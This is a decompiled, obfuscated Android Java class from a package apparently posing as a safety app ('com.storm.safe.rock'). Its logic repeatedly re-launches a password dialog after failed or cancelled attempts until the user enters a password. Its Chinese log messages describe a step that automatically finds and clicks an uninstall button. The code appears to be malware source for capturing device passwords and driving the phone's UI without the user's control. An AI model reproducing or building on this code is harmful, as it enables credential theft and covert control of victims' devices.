package com.storm.safe.rock.service;

import android.os.Handler;
import android.os.Looper;
import com.storm.safe.rock.activity.syuqattwmgit;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1262tj;
import p000.C1351vv;
import p000.bm0;
import p000.h10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.a4 */
/* loaded from: classes2.dex */
public final /* synthetic */ class RunnableC0284a4 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f52342a0;

    /* renamed from: a1 */
    public final /* synthetic */ dqtvuisjd f52343a1;

    public /* synthetic */ RunnableC0284a4(dqtvuisjd dqtvuisjdVar, int i) {
        this.f52342a0 = i;
        this.f52343a1 = dqtvuisjdVar;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.f52342a0) {
            case 0:
                final dqtvuisjd dqtvuisjdVar = this.f52343a1;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                try {
                    t60.m214714d6("dqtvuisjd", "📱 启动 syuqattwmgit... (第" + (dqtvuisjdVar.f52471k2 + 1) + "次)");
                    syuqattwmgit.f51917a3.start(dqtvuisjdVar, 0, new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$launchPasswordDialog$1$1
                        {
                            super(1);
                        }

                        @Override // p000.h10
                        public final Object invoke(Object obj) {
                            if (((Boolean) obj).booleanValue()) {
                                t60.m214714d6("dqtvuisjd", "✅ 密码验证成功，停止重试");
                                dqtvuisjdVar.f52474k5 = false;
                                dqtvuisjdVar.f52471k2 = 0;
                            } else {
                                dqtvuisjdVar.f52471k2++;
                                if (dqtvuisjdVar.f52474k5) {
                                    int i = dqtvuisjdVar.f52471k2;
                                    dqtvuisjd dqtvuisjdVar2 = dqtvuisjdVar;
                                    int i2 = dqtvuisjdVar2.f52472k3;
                                    if (i >= i2) {
                                        t60.m214726f4("dqtvuisjd", "⚠️ 密码监听已达最大重试次数(" + i2 + ")，停止");
                                        dqtvuisjdVar.f52474k5 = false;
                                        dqtvuisjdVar.f52471k2 = 0;
                                    } else {
                                        t60.m214714d6("dqtvuisjd", "🔄 密码验证失败/取消，" + dqtvuisjdVar2.f52473k4 + "ms后重新弹出 (" + dqtvuisjdVar2.f52471k2 + "/" + dqtvuisjdVar.f52472k3 + ")");
                                        C0335a1 c0335a1 = dqtvuisjdVar.f52438g9;
                                        if (c0335a1 != null) {
                                            C0335a1.m211788c1(c0335a1);
                                        }
                                        Handler handler = new Handler(Looper.getMainLooper());
                                        dqtvuisjd dqtvuisjdVar3 = dqtvuisjdVar;
                                        handler.postDelayed(new bm0(dqtvuisjdVar3, 9), dqtvuisjdVar3.f52473k4);
                                    }
                                } else {
                                    t60.m214714d6("dqtvuisjd", "🛑 密码监听已被外部停止，不再重试");
                                }
                            }
                            return C1351vv.f60710b1;
                        }
                    });
                    break;
                } catch (Exception e) {
                    tz0.m214808a8("❌ 启动 syuqattwmgit 失败: ", e.getMessage(), "dqtvuisjd", e);
                    dqtvuisjdVar.f52474k5 = false;
                    return;
                }
            default:
                dqtvuisjd dqtvuisjdVar2 = this.f52343a1;
                dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
                t60.m214714d6("dqtvuisjd", "🔍 Step 4: 查找并点击卸载按钮");
                AbstractC0780a0.m213692a3(dqtvuisjdVar2.f52378a9, AbstractC1262tj.f60233a0, new dqtvuisjd$findAndClickUninstallButton$1(dqtvuisjdVar2, null), 2);
                break;
        }
    }
}
